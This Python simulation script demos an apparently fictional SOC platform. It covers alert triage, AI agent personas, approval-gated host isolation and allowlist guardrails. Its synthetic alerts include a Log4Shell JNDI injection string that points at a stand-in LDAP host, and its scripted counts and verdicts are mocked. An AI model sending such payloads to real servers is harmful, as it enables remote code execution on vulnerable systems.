"""Terminus 2.0 Live Flood & Multi-Agent Response Simulation.

Simulates a massive incident surge where a SOC analyst:
1. Experiences an incoming alert flood (noise, triage, and critical exploit surges).
2. Leverages the Deterministic Policy Engine for sub-millisecond noise suppression.
3. Dynamically deploys specialized AI SOC agent fleet personas.
4. Constructs and executes visual DAG automation playbooks with containment gates.
5. Manages human-in-the-loop approval workflows and active host isolation.
6. Engages the AI Copilot to correlate multi-host attack clusters.
"""

from __future__ import annotations

import asyncio
import secrets
import sys
import time
from datetime import UTC, datetime, timedelta
from typing import Any
from unittest.mock import AsyncMock, MagicMock

from terminus.core.ids import OrgId, RuleId
from terminus.models import (
    AgentStatus,
    Confidence,
    Evidence,
    InvestigationReport,
    PolicyResult,
    Severity,
    SiemAlert,
    SocAgent,
    Tier,
    Verdict,
    Workflow,
    WorkflowEdge,
    WorkflowNode,
)
from terminus.pipeline.deployment import PipelineDeployment
from terminus.pipeline.runner import PipelineRunner
from terminus.pipeline.workflow_engine import WorkflowEngine
from terminus.policies.engine import PolicyEngine
from terminus.server.copilot_tools import IncidentTools, compute_full_layout
from terminus.storage.db import Database
from terminus.storage.repositories import (
    SqliteAgentRepository,
    SqliteAlertClaimRepository,
    SqliteAllowlistRepository,
    SqliteApprovalRepository,
    SqliteIncidentRepository,
    SqliteWorkflowRepository,
    SqliteWorkflowRunRepository,
)

# ANSI formatting helpers
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def print_banner(text: str, color: str = CYAN) -> None:
    line = "=" * 78
    print(f"\n{color}{BOLD}{line}")
    print(f"  {text}")
    print(f"{line}{RESET}\n")


async def simulate_flood() -> None:
    start_time = time.time()
    org_id = "org-enterprise-soc"

    # Initialize SQLite Database & Repositories
    db_path = "terminus_flood_sim.db"
    db = Database(db_path)
    Database._instance = db

    agent_repo = SqliteAgentRepository(db)
    workflow_repo = SqliteWorkflowRepository(db)
    approval_repo = SqliteApprovalRepository(db)
    run_repo = SqliteWorkflowRunRepository(db)
    claim_repo = SqliteAlertClaimRepository(db)
    allowlist_repo = SqliteAllowlistRepository(db)
    incident_repo = SqliteIncidentRepository(db)

    # 1. Setup Safety Allowlists (D12)
    allowlist_repo.add_entry(
        entry_id="al-dc01",
        org_id=org_id,
        kind="hostname",
        value="dc01.corp.internal",
        note="Primary Active Directory Domain Controller",
        created_by="sec-admin",
    )
    allowlist_repo.add_entry(
        entry_id="al-gw",
        org_id=org_id,
        kind="ip",
        value="10.0.0.1",
        note="Default Gateway Core Router",
        created_by="sec-admin",
    )

    # Mock Deployment Components
    policy_engine = PolicyEngine()
    ticket_store = incident_repo
    notifier = MagicMock()
    notifier.notify = AsyncMock(return_value=True)

    # Fast Autonomous Investigation Agent Mock
    agent = MagicMock()

    async def mock_investigate(alert: SiemAlert, org: OrgId) -> InvestigationReport:
        policy_res = policy_engine.evaluate(alert)
        sev_map = {
            Tier.IGNORE: Severity.LOW,
            Tier.TRIAGE: Severity.MEDIUM,
            Tier.ESCALATE: Severity.HIGH if alert.level < 14 else Severity.CRITICAL,
        }
        verdict = Verdict(
            severity=sev_map.get(policy_res.tier, Severity.MEDIUM),
            confidence=Confidence.HIGH,
            summary=f"Automated forensic analysis of {alert.rule_description or alert.description}. Source IP: {alert.src_ip or 'internal'}.",
            recommended_actions=["Inspect host memory", "Validate perimeter egress"],
        )
        evidence = Evidence(
            alert=alert,
            agent_name=alert.agent_name,
            threat_intel="Threat intelligence indicator matched adversary infrastructure",
            context_notes=f"Rule ID {alert.rule_id} triggered with level {alert.level}",
        )
        return InvestigationReport(
            alert_id=alert.id,
            policy=policy_res,
            verdict=verdict,
            evidence=evidence,
        )

    agent.investigate = AsyncMock(side_effect=mock_investigate)

    deployment = PipelineDeployment(
        policy_engine=policy_engine,
        agent=agent,
        notifier=notifier,
        ticket_store=ticket_store,
    )

    runner = PipelineRunner(
        deployment=deployment,
        db=db,
    )

    print_banner("[STAGE 0] TERMINUS 2.0 - HIGH-THROUGHPUT SOC INCIDENT SURGE SIMULATION", CYAN)
    print(f"{DIM}Organization:{RESET} {BOLD}{org_id}{RESET}")
    print(f"{DIM}Storage Engine:{RESET} SQLite Thread-Local WAL ({db_path})")
    print(f"{DIM}Active Guardrails:{RESET} Domain Controller Allowlist & Blast Radius Protection Active")
    print(f"{DIM}Simulation Duration:{RESET} Multi-Wave Accelerated Scenario (10-minute real-world load)")

    # ──────────────────────────────────────────────────────────────────────────
    # WAVE 1: INITIAL ALERT FLOOD (Noise + Exploit Probing)
    # ──────────────────────────────────────────────────────────────────────────
    print_banner("[STAGE 1] INCOMING ALERT FLOOD (60 Events Ingested)", YELLOW)
    print(f"{YELLOW}A sudden distributed adversary scan hits the perimeter and endpoints...{RESET}")

    wave1_alerts: list[SiemAlert] = []
    # 35 Benign/Noise alerts (Level 2-4)
    for i in range(1, 36):
        wave1_alerts.append(
            SiemAlert(
                id=f"alt-noise-{i:03d}",
                rule_id=RuleId(1001),
                level=3,
                description="ICMP Ping Scan & Routine Network Keep-Alive",
                src_ip=f"192.168.1.{10 + (i % 20)}",
                agent_name=f"srv-edge-{i % 5:02d}.corp.internal",
                full_log=f"Routine health probe event {i}",
            )
        )
    # 15 Medium Triage Alerts (Level 6-8)
    for i in range(1, 16):
        wave1_alerts.append(
            SiemAlert(
                id=f"alt-triage-{i:03d}",
                rule_id=RuleId(5710),
                level=7,
                description="SSH / RDP Authentication Failure Burst",
                src_ip="203.0.113.88",
                agent_name=f"workstation-{i % 10:02d}.corp.internal",
                full_log=f"Failed login attempt for user admin from 203.0.113.88 attempt {i}",
            )
        )
    # 10 Critical Escalate Alerts (Level 12-14)
    for i in range(1, 11):
        wave1_alerts.append(
            SiemAlert(
                id=f"alt-exploit-{i:03d}",
                rule_id=RuleId(100020 + i),
                level=12,
                description="Log4Shell JNDI Payload Injection Attempt",
                mitre="T1190",
                src_ip="198.51.100.42",
                agent_name=f"app-gateway-{i % 3:02d}.corp.internal",
                full_log=f"GET /search?q=${{jndi:ldap://198.51.100.42/payload_{i}}}",
            )
        )

    noise_count = 0
    triage_count = 0
    escalate_count = 0

    for idx, alert in enumerate(wave1_alerts, 1):
        rep = await runner.process_alert(alert, org_id)
        if rep.policy.tier == Tier.IGNORE:
            noise_count += 1
            sys.stdout.write(f"\r{DIM}[Alert {idx:02d}/60]{RESET} {GREEN}[FILTERED NOISE]{RESET} Level {alert.level} -> Policy IGNORE (0 LLM Tokens)")
        elif rep.policy.tier == Tier.TRIAGE:
            triage_count += 1
            sys.stdout.write(f"\r{DIM}[Alert {idx:02d}/60]{RESET} {YELLOW}[TRIAGED TICKET]{RESET} Level {alert.level} -> Ticket created: {alert.description[:35]}...")
        else:
            escalate_count += 1
            sys.stdout.write(f"\r{DIM}[Alert {idx:02d}/60]{RESET} {RED}[ESCALATED ALERT]{RESET} Level {alert.level} -> High Priority Investigation: {alert.description[:35]}...")
        sys.stdout.flush()
        await asyncio.sleep(0.01)

    print()
    print(f"\n{BOLD}Wave 1 Telemetry Summary:{RESET}")
    print(f"  * {GREEN}Noise Filtered (Level < 5):{RESET} {noise_count} alerts ({noise_count / len(wave1_alerts):.1%} of flood suppressed at 0 LLM cost)")
    print(f"  * {YELLOW}Triaged Tickets (Level 5-9):{RESET} {triage_count} incidents logged to queue")
    print(f"  * {RED}Escalated Threats (Level >= 10):{RESET} {escalate_count} critical incidents identified")

    # ──────────────────────────────────────────────────────────────────────────
    # WAVE 2: ANALYST DEPLOYS SPECIALIZED AI AGENT FLEET
    # ──────────────────────────────────────────────────────────────────────────
    print_banner("[STAGE 2] CONFIGURING SPECIALIZED AI AGENT FLEET", MAGENTA)
    print(f"{MAGENTA}Analyst provisions specialized AI personas to tackle the ongoing investigation load...{RESET}\n")

    agents_to_deploy = [
        SocAgent(
            id="agent-triage-sentinel",
            name="Triage Sentinel AI",
            role_description="Ultra-fast alert filtering, MITRE ATT&CK correlation, and noisy source suppression.",
            master_prompt="You are Triage Sentinel. Analyze inbound SIEM telemetry, evaluate MITRE tags, and filter false alarms.",
            status=AgentStatus.ACTIVE,
            created_at=datetime.now(UTC).isoformat(),
        ),
        SocAgent(
            id="agent-forensic-hunter",
            name="Forensic Memory & IOC Hunter",
            role_description="Deobfuscates malicious PowerShell payloads, correlates IOCs, and maps adversary kill-chains.",
            master_prompt="You are Forensic Hunter. Deeply analyze memory dumps, credential attacks (Kerberoasting, LSASS), and render structured JSON verdicts.",
            status=AgentStatus.ACTIVE,
            created_at=datetime.now(UTC).isoformat(),
        ),
        SocAgent(
            id="agent-containment-guard",
            name="Containment Operator",
            role_description="Executes audited network boundary blocks and workstation isolation with blast-radius safety checks.",
            master_prompt="You are Containment Operator. Formulate safe, targeted containment plans adhering to infrastructure safety policies.",
            status=AgentStatus.ACTIVE,
            created_at=datetime.now(UTC).isoformat(),
        ),
    ]

    for agt in agents_to_deploy:
        saved = agent_repo.save(agt, org_id)
        print(f"  {GREEN}[+] Deployed AI Agent:{RESET} {BOLD}{saved.name}{RESET} ({saved.id}) - {DIM}{saved.role_description}{RESET}")
        await asyncio.sleep(0.05)

    # ──────────────────────────────────────────────────────────────────────────
    # WAVE 3: CONFIGURING & ENABLING VISUAL DAG PLAYBOOKS (D1, D11, D14)
    # ──────────────────────────────────────────────────────────────────────────
    print_banner("[STAGE 3] COMPOSING EXECUTABLE WORKFLOW PLAYBOOKS (D1, D11, D14)", CYAN)
    print(f"{CYAN}Analyst designs visual DAG automation playbooks with strict containment safety gates...{RESET}\n")

    # Playbook 1: Slack Escalation Playbook
    wf1 = Workflow(
        id="wf-slack-triage",
        name="Automated High-Severity Slack Alerting",
        enabled=True,
        priority=20,
        version=1,
        nodes=[
            WorkflowNode(id="n1", type="trigger_wazuh", config={"min_level": 8}),
            WorkflowNode(id="n2", type="condition_severity", config={"min_level": 8}),
            WorkflowNode(id="n3", type="tool_slack", config={"channel": "#soc-incident-war-room"}),
        ],
        edges=[
            WorkflowEdge(id="e1", source="n1", target="n2", source_handle="default"),
            WorkflowEdge(id="e2", source="n2", target="n3", source_handle="true"),
        ],
    )
    workflow_repo.save_workflow(org_id, wf1)
    print(f"  {GREEN}[+] Playbook 1 Enabled:{RESET} {BOLD}{wf1.name}{RESET} (Priority: {wf1.priority})")

    # Playbook 2: Critical Ransomware Active Isolation Playbook (Strictly Gated per D11)
    wf2 = Workflow(
        id="wf-active-isolation",
        name="Critical Ransomware & Active Isolation Gate",
        enabled=True,
        priority=10,  # Higher priority
        version=1,
        nodes=[
            WorkflowNode(id="n1", type="trigger_wazuh", config={"min_level": 12}),
            WorkflowNode(id="n2", type="condition_severity", config={"min_level": 12}),
            WorkflowNode(id="n3", type="condition_approval", config={"required_role": "admin", "prompt_message": "Authorize emergency host network isolation"}),
            WorkflowNode(id="n4", type="tool_isolate", config={"force_override": False}),
            WorkflowNode(id="n5_blocked", type="tool_slack", config={"channel": "#containment-blocked-alerts"}),
        ],
        edges=[
            WorkflowEdge(id="e1", source="n1", target="n2", source_handle="default"),
            WorkflowEdge(id="e2", source="n2", target="n3", source_handle="true"),
            WorkflowEdge(id="e3", source="n3", target="n4", source_handle="true"),
            WorkflowEdge(id="e4", source="n4", target="n5_blocked", source_handle="on_error"),
        ],
    )
    workflow_repo.save_workflow(org_id, wf2)
    print(f"  {GREEN}[+] Playbook 2 Enabled:{RESET} {BOLD}{wf2.name}{RESET} (Priority: {wf2.priority}, Containment Gated: TRUE)")

    # ──────────────────────────────────────────────────────────────────────────
    # WAVE 4: COORDINATED CRITICAL RANSOMWARE SURGE
    # ──────────────────────────────────────────────────────────────────────────
    print_banner("[STAGE 4] CRITICAL ATTACK SURGE & APPROVAL RESUMPTION LIFECYCLE", RED)
    print(f"{RED}Adversary launches coordinated ransomware execution across multiple endpoints!{RESET}\n")

    surge_alerts = [
        # Target 1: Standard compromised workstation -> pauses for approval -> gets approved & isolated
        SiemAlert(
            id="alt-surge-workstation-88",
            rule_id=RuleId(100033),
            level=14,
            description="Active Ransomware Binary Mass File Encryption",
            mitre="T1486",
            src_ip="198.51.100.99",
            agent_name="workstation-88.corp.internal",
            full_log="C:\\Windows\\Temp\\lockbit.exe started encrypting shares from 198.51.100.99",
        ),
        # Target 2: Protected Domain Controller -> triggers Playbook -> blocked by Safety Guardrail!
        SiemAlert(
            id="alt-surge-dc01-attack",
            rule_id=RuleId(100034),
            level=14,
            description="LSASS Memory Injection on Domain Controller",
            mitre="T1003",
            src_ip="198.51.100.99",
            agent_name="dc01.corp.internal",  # Protected in Allowlist & Guardrails!
            full_log="Adversary injecting shellcode into lsass.exe on primary DC",
        ),
    ]

    # Process Target 1
    print(f"{BOLD}[Surge Event 1]{RESET} Processing alert on {BOLD}workstation-88.corp.internal{RESET} (Level 14)...")
    await runner.process_alert(surge_alerts[0], org_id)

    # Check approval state
    pending = approval_repo.list_pending(org_id)
    assert len(pending) >= 1
    apprv = pending[0]
    print(f"  {YELLOW}[PAUSED]{RESET} Playbook '{wf2.name}' reached Human Approval Gate (ID: {apprv['approval_id']})")
    print(f"  {YELLOW}[PROMPT]{RESET} \"{apprv['prompt_message']}\"")
    print(f"  {CYAN}[ANALYST ACTION]{RESET} Reviewing telemetry & authorizing host isolation...")

    # Analyst approves
    approval_repo.resolve_approval(org_id, apprv["approval_id"], "APPROVED", resolved_by="senior-analyst@corp.internal")
    engine = WorkflowEngine(db=db)
    resumed_ctx = await engine.resume_run(
        run_id=apprv["run_id"],
        org_id=org_id,
        deployment=deployment,
        approver="senior-analyst@corp.internal",
    )
    print(f"  {GREEN}[RESUMED]{RESET} Containment action {BOLD}ISOLATE HOST{RESET} executed successfully!")
    print(f"  {GREEN}[OUTCOME]{RESET} Status: {resumed_ctx.status} | Outcome: {resumed_ctx.outcome} (Side Effects Executed: True)")

    print()
    # Process Target 2 (Protected DC)
    print(f"{BOLD}[Surge Event 2]{RESET} Processing alert targeting {BOLD}dc01.corp.internal{RESET} (Domain Controller)...")
    await runner.process_alert(surge_alerts[1], org_id)

    # The DC run pauses on approval, analyst attempts approval, but Guardrail BLOCKS it
    pending_dc = approval_repo.list_pending(org_id)
    if pending_dc:
        dc_apprv = pending_dc[0]
        approval_repo.resolve_approval(org_id, dc_apprv["approval_id"], "APPROVED", resolved_by="senior-analyst@corp.internal")
        dc_resumed = await engine.resume_run(
            run_id=dc_apprv["run_id"],
            org_id=org_id,
            deployment=deployment,
            approver="senior-analyst@corp.internal",
        )
        print(f"  {RED}[GUARDRAIL BLOCKED]{RESET} Containment on 'dc01.corp.internal' was {BOLD}BLOCKED{RESET}!")
        print(f"  {YELLOW}[SAFETY RATIONALE]{RESET} Target hostname matches protected infrastructure allowlist / critical token.")
        print(f"  {YELLOW}[ERROR ROUTE]{RESET} Diverted to '{wf2.nodes[4].config.get('channel')}' channel without taking down the DC!")

    # ──────────────────────────────────────────────────────────────────────────
    # WAVE 5: COPILOT INVESTIGATION & THREAT CORRELATION
    # ──────────────────────────────────────────────────────────────────────────
    print_banner("[STAGE 5] COPILOT FORENSIC ANALYSIS & SOURCE CORRELATION", CYAN)
    print(f"{CYAN}Analyst uses the AI Copilot tools to inspect the active incident workload...{RESET}\n")

    copilot_tools = IncidentTools(store=incident_repo, org_id=org_id, db=db)

    # 1. Correlate attack sources
    corr_res = await copilot_tools.execute("correlate_sources", {})
    sources = corr_res.get("observed_sources", [])
    print(f"{BOLD}Top Correlated Attack Sources Across All Telemetry:{RESET}")
    for s in sources[:3]:
        print(f"  * {RED}Source IP:{RESET} {BOLD}{s['ip']}{RESET} - {s['incident_count']} related incidents linked across multi-host attack cluster")

    # 2. Query incidents
    inc_res = await copilot_tools.execute("list_incidents", {"status": "OPEN"})
    print(f"\n{BOLD}Active Incident Queue Summary:{RESET}")
    print(f"  * Total Open Incidents Recorded in DB: {inc_res.get('total', 0)}")

    elapsed = time.time() - start_time
    print_banner("[COMPLETE] FULL SCENARIO COMPLETED SUCCESSFULLY", GREEN)
    print(f"{BOLD}Final Operations Posture:{RESET}")
    print(f"  * Total Telemetry Events Processed: {len(wave1_alerts) + len(surge_alerts)}")
    print(f"  * Sub-millisecond Noise Suppression Rate: {(noise_count / len(wave1_alerts)) * 100:.1f}%")
    print(f"  * Specialized AI Agent Fleet Members: {len(agent_repo.list_for_org(org_id))}")
    print(f"  * Active Automation Playbooks Executed: {len(workflow_repo.list_for_org(org_id))}")
    print(f"  * Active Containment Host Isolations: 1 (workstation-88 contained)")
    print(f"  * Infrastructure Guardrail Blocks: 1 (dc01.corp.internal protected)")
    print(f"  * Execution Time: {elapsed:.2f}s (Real-time accelerated simulation)")
    print("=" * 78)


if __name__ == "__main__":
    asyncio.run(simulate_flood())
